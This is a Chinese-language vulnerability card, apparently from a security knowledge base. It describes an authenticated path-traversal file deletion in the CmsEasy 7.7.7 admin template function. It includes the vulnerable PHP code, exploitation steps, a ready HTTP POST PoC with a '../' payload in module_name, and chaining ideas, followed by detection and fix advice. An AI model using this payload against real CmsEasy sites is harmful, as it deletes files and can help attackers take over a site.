---
id: web-php-cmseasy-template-editcategorytemplate-module-name-unlink
title: CmsEasy 后台 editcategorytemplate：POST module_name 按 {tag_...} 解析后拼接模板缓存路径，../ 穿越 unlink 删除任意文件
type: scenario
domain: web
path: web/php
technique: cmseasy-template-module-name-tag-format-traversal-unlink
aliases:
- CmsEasy 模板缓存删除
- editcategorytemplate 任意文件删除
- module_name tag 格式穿越
- template_admin unlink
- tag_buymodules_category_s_1_/../../: null
tags:
- php
- cmseasy
- arbitrary-file-delete
- path-traversal
- unlink
- template
- admin
- cms
cve: []
severity: medium
confidence: high
affected_versions: CmsEasy 7.7.7
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V441
  verified_at: '2026-11-09T22:11:27+08:00'
  notes: 已对照原文核对：图11-16 template_admin editcategorytemplate_action 中 preg_match /^{tag_(.*)}$/、explode(_) 后非 shop 取 module_type=$str[2]/module_name=$str[3]/module_id=$str[4]、shop 后移一位、#.$module_id.".php" 拼接与两处 unlink 均与卡内一致；图15-17 显示正常路径 .../cn/template/buymodules/s/1/#2.php 与穿越载荷 {tag_buymodules_category_s_1_/../../../../2} 删除 cn/template/2.php。affected_versions 已 set-versions 为 CmsEasy 7.7.7；原文未给 CVE 编号，cve 留空；未实测。
---

## 一句话结论

CmsEasy 后台 `lib/admin/template_admin.php` 的 `editcategorytemplate_action` 会读取 `front::$post['module_name']`，按 `{tag_xxx_xxx_xxx}` 格式用 `_` 拆出 `module_type/module_name/module_id` 后拼成模板缓存路径并 `unlink`；其中 `module_id` 未做过滤，攻击者构造 `{tag_buymodules_category_s_1_/../../../../2}` 即可把 `module_id` 变成穿越段，删除模板目录之外的任意文件。

## 原理

- **入口**：`index.php?case=template&act=editcategorytemplate&admin_dir=admin` 进入 `template_admin::editcategorytemplate_action`；`front::$post` 在 `front_class.php` 中直接等于 `$_POST`，因此 `module_name` 完全可控。
- **解析分支**：当 `module_name` 不含 `tag_sections` 时，代码执行 `preg_match('/^{tag_(.*)}$/', $module_name, $matches)`，把捕获内容按 `_` 拆成数组；非 shop 类型取 `module_type=$str[2]`、`module_name=$str[3]`、`module_id=$str[4]`（shop 分支则整体后移一位）。
- **危险拼接**：
  ```php
  $cacheFile  = ROOT.'./cache/template/'.$lang.'/buymodules/'.$module_type.'/'.$module_name.'/#'.$module_id.'.php';
  $cache_path = ROOT.'./'.$lang.'/template/buymodules/'.$module_type.'/'.$module_name.'/#'.$module_id.'.php';
  if (file_exists($cacheFile))  unlink($cacheFile);
  if (file_exists($cache_path)) unlink($cache_path);
  ```
  `module_id` 前固定拼了一个 `#` 作为目录名，因此穿越段要带上足够的 `../` 先把 `#`、`module_name`、`module_type`、`buymodules` 逐级弹掉。原文载荷为
  `{tag_buymodules_category_s_1_/../../../../2}`：拆分后 `module_type=s`、`module_name=1`、`module_id=/../../../../2`，解析为 `.../template/buymodules/s/1/#/../../../../2.php` → `.../template/2.php`。
- **为什么过滤没拦住**：代码只做了格式匹配，没有对 `module_id` 做数字校验、`basename` 或 `realpath` 包含性检查；`#`、`..` 都是合法目录字符。
- **参数细节**：请求中可先放一个 `module_name=213` 再放真正的 `{tag_...}`；PHP 对同名参数取最后一个值，前者不影响利用（原文 PoC 即如此）。
- **影响**：后台用户可删除模板缓存与模板文件，造成页面异常或删除安全文件；与删除安装锁/配置组合可用于重置/重装（原文仅演示删除测试文件）。

## 触发条件

- 拥有 CmsEasy 后台管理员会话（`admin_dir=admin` + 登录 Cookie）。
- 目标版本存在该 `editcategorytemplate_action` 实现（原文环境 CmsEasy 7.7.7，2024-01-05）。
- `module_name` 需满足 `^{tag_.*}$` 格式；Web 进程对目标路径有删除权限。

## 利用步骤

1. 登录后台，进入模板管理，抓取 `case=template&act=editcategorytemplate` 请求与 Cookie。
2. 计算穿越深度：路径固定包含 `buymodules/<module_type>/<module_name>/#`，要删除 `template/` 下文件需 `../../../../`（原文载荷）。
3. 构造 `module_name`：`{tag_buymodules_category_s_1_/../../../../<目标文件>}`（去掉 `.php`，代码会自动补 `.php`）。
4. 发送 POST，观察响应；若需验证可临时在源码中加入对拼接路径的 `echo`（原文做法），或直接检查目标文件是否消失。
5. 可重复利用删除不同文件；注意 `file_exists` 为真才会 `unlink`，目标需存在。

## PoC

```http
POST /index.php?case=template&act=editcategorytemplate&admin_dir=admin HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<后台会话>; login_username=admin; login_password=<登录校验值>
Connection: close

id=1&module_name=213&module_name=%7Btag_buymodules_category_s_1_%2F..%2F..%2F..%2F..%2F2%7D
```

（URL 解码后为 `{tag_buymodules_category_s_1_/../../../../2}`；目标为 `cn/template/2.php`，代码自动追加 `.php`。）

## 变体与关联

- 变体：shop 类型（`$str[1] == 'shop'`）走 `module_type=$str[3]`、`module_name=$str[4]`、`module_id=$str[5]`，穿越段位置相应后移一位。
- 变体：穿越段不一定放在 `module_id`；只要最终路径中出现可控的 `_` 分段，均可尝试调整解析下标把 `../` 放进其他变量。
- 关联：[[web-php-cmseasy-image-deleteimg-dir-traversal-file-delete]]（同版本另一处 unlink 删除，入口为 GET 的 `dir`）、[[web-php-zentao-backup-editor-arbitrary-file-delete]]（同类后台 unlink 穿越）、[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（同产品模板写入 RCE，可组合）。
- 边界：需要后台权限；路径深度随安装目录结构变化，`../` 数量需按实际路径调整；`open_basedir` 可能限制跨目录操作。

## 检测与防御

- 代码层：`module_id` 强制整数校验（`intval`/正则）并对最终路径做 `realpath` 包含性检查；不要用用户可控字符串拼接 `unlink` 路径。
- 权限层：Web 进程只对缓存目录有写权限，模板源码目录只读；后台操作留审计日志。
- 监测：后台请求中出现 `module_name` 含 `{tag_` 且带 `../`、模板文件/缓存异常消失时告警；对站点目录做完整性监控。
- 修复：升级厂商修复版本；无法升级时在 WAF 拦截 `module_name` 中的 `../` 与 `%2F..` 组合。
